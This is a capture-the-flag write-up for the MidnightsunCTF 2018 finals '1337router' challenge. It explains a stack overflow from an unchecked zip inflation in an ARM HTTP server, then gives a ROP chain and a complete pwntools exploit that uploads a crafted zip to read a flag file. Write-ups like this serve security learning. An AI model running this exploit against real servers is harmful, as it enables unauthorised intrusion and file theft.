---
layout: post
category: Pwn
title: MidnightsunCTF finals 2018 1337router
tags: 
    - kowu
---

1337router was an arm executable, aslr disabled, implementing a HTTP server. The vulnerability was that we could upload a zip file (wich contained a httpd.conf). The zip got deflated afterwards. The zip file had a size limitation of 512 bytes. Of course the deflated size was not checked and it got deflated on the stack. Its time for ROPgadget.


I used a function of the executable to help me in reading any file. It was meant to read a html file and send it back as a HTTP response. It had two parameters. Buffer (in r1) and a path to the file (in r0). As there was no aslr buffer could just point to a static position. r0 was a little bit more difficult as the stack had randomization. However gdb told me that r4 pointed into the stack at a controllable position, so lets just move r4 into r0. We end up with a simple ropchain.

```
0x849ec pop{r1, pc};
0x691ec mov r0, r4; pop {r4, r5, r6, r7, r8, pc};
0x10934 sendresponse(buf, filepath);
```

the final dirty code.

```python
from pwn import *
import zipfile

r = remote("34.254.34.57", 5555)


def buildreq(content):
    return "POST /page?=conf HTTP/1.1\r\n" + \
           "Host: 34.254.34.57:5555\r\n" + \
           "Connection: keep-alive\r\n" + \
           "Content-Length: " + str(191 + len(content)) + "\r\n" + \
           "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOVOtoTifyI9clR75\r\n" + \
           "User-Agent: Mozilla/5.0\r\n" + \
           "Accept: text/html\r\n\r\n" + \
           "------WebKitFormBoundaryOVOtoTifyI9clR75\r\n" + \
           "Content-Disposition: form-data; name=\"config\"; filename=\"config.zip\"\r\n" + \
           "Content-Type: application/zip\r\n\r\n" + \
           content + \
           "------WebKitFormBoundaryOVOtoTifyI9clR75--\r\n\r\n"


def sploit():
    fname = "flag"
    with zipfile.ZipFile("file.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
        zip.writestr(
            "httpd.conf", "A" * 524 + struct.pack(
            "<IIIIIIIII", 0x849ec, 0xaef4c, 0x691ec, 0, 0, 0, 0, 0, 0x10934) + "B" * 8 + fname + '\x00')
    with open("file.zip", "rb") as f:
        content = f.read()
    r.send(buildreq(content))
    r.interactive()


if __name__ == '__main__':
    sploit()

```
